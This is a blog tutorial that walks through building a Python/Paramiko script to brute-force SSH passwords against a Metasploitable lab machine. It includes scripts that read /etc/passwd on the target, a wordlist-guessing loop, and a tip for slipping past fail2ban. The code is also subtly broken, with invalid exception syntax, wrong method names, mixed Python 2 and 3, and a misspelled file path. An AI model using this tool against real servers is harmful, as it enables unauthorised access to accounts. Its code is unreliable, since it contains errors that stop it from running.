---
title: "Brute Force SSH"
date: 2018-04-16T20:33:58-05:00
draft: false
# feature_image: "images/siteLogo.png"
---

Introduction
============

This tutorial will teach you how to write a Python script using Paramiko
to bruit force SSH. I will start by showing you how to make a
connection, send input and receive output, and finish with brute
forcing. In this tutorial I will be attacking Metasploitable and I
recommend you do as well. I have a handy tutorial on how to set up
Metasploitable if you need any help.

Prerequisites
=============

-   Python 3.7

-   Docker

Basic Python skills are required you can copy and past this script,
however understanding will get you much farther.

The first prerequisite is of coarse Python, Python 3.7 to be specific.
If you are running any Linux or BSD distro you already have Python
installed. If you are running Windows you can download Python here.

Paramiko is a Python library that makes working with SSH so simple. To
install Paramiko we will be using pip.

```bash
pip install paramiko
```

Now you just need a SSH server to attack. Pleas do not attack a server
you do not own. It is illegal in most parts of the world to access a
computer with out the owners permission.

Step 1
======

First, we will start by creating a file named `brute_force_ssh.py` and try to make a simple SSH connection.

```python 
#!/usr/bin/python3.7

import paramiko 

ssh = paramiko.SSHClient() 
ssh.set_missinghostkeypolicy(paramiko.AutoAddPolicy()) 

try:
    ssh.connect('192.168.56.101',
        username='msfadmin',
        password='msfadmin') 
    ssh.close() 
except as ex:
    print(ex) 

```

Lets brake this down a bit. To begin with I want to run this script
without having to call Python. For example I want run this script with the following:
```bash
./bruit_force_ssh.py
```
First we need to make the file executable. To do that run:
```bash
chmod +x brute_force_ssh.py
```

We can do this because of the first line
`#!/usr/bin/python3.7`. 

To use Paramiko it has to be imported. That is
done with the second line `import paramiko`. 
We want to connect to a SSH server so we need to create an SSH client. We do that with the following 
```python
ssh = paramiko.SSHClient() 
```
If you are connecting to a SSH server for the first time you
will want to set the host key. That is done with:

```python
ssh.set_missinghostkeypolicy(paramiko.AutoAddPolicy())
```

All that is left is to try to connect and if that fails quit.
That is done with the try and except.

To connect to a server you need the IP address, username, and
password. Observe how I do it here in the example below:
```python
ssh.connect('192.168.56.101', 
    username='msfadmin',
    password='msfadmin')
```

The IP address of the Metasploitable VM is
`192.168.56.101`. We know the username is `msfadmin` and the
password is `msfadmin`. If this fails to make a connection it
will through an exception witch we will just print at this time.

Step 2
======

This next step we add input and receive output. We will reuse
the code from above and three lines. Lets take a look.

```python 
#!/usr/bin/python3.7 

import paramiko 

ssh = paramiko.SSHClient() 
ssh.set_missinghostkeypolicy(paramiko.AutoAddPolicy())
try:
    ssh.connect('192.168.56.101',
        username='msfadmin',
        password='msfadmin')
    sdtin, stdout, stderr = ssh.exec_command('cat /etc/passwd') 
    for line in stdout.readlines():
        print(line.strip())
    ssh.close() 
except as ex:
    print(ex)
```

Did you notice what was added? Look in the try statement, you
will see I added the following:

```python
sdtin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
```

This line of code sill set up standard input, standard
output, and standard error, along with executing code. In this
case we are concatenating the passwd file. To view this out
put I use the following for loop:
```python
for line in stdout.readlines():
    print(line.strip())

```
Notice we are looping through the stdout and printing the
content.

Step 3
======

This is where the fun part takes place. We need to go through a password
list and try each one. Notice I have changed the code a bit, however it
is also the same. All I have done is put the try, except, and finally
into a function. I also added a for loop to loop through the password
list. I would also like to add that I added the password msfadmin to the
fasttrack.txt file.

```python
#!/usr/bin/python3.7 

import paramiko

ssh = paramiko.SSHClient() 
ssh.set_missinghostkeypolicy(paramiko.AutoAddPolicy()) 

def attack_ssh(passwd) -> str:
    try: 
        ssh.connect('192.168.56.101', 
            username='msfadmin', 
            password= passwd)
        sdtin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
        for line in stdout.readlines():
            print line.strip()
        ssh.close()
        return passwd

    except:
        return None
     
    
with open("/usr/share/wordlists/fasttraack.txt", mode="r")as file:
    for passwd in file.split("\n"):
        p = attack_ssh(passwd)
        if p:
            print("Password is:", passwd)
```

That's it! This script can and should be modified to
your needs. I suggest adding threading to speed up the process. Or you
can add a delay to attack a SSH server with fail2ban.

Summary
=======

Attacking a SSH server is quite simple when using Paramiko and Python.
There is much more that needs to be done to truly make this script work. However, this should give you a good start.

Note: this blog post was updated in 2022.
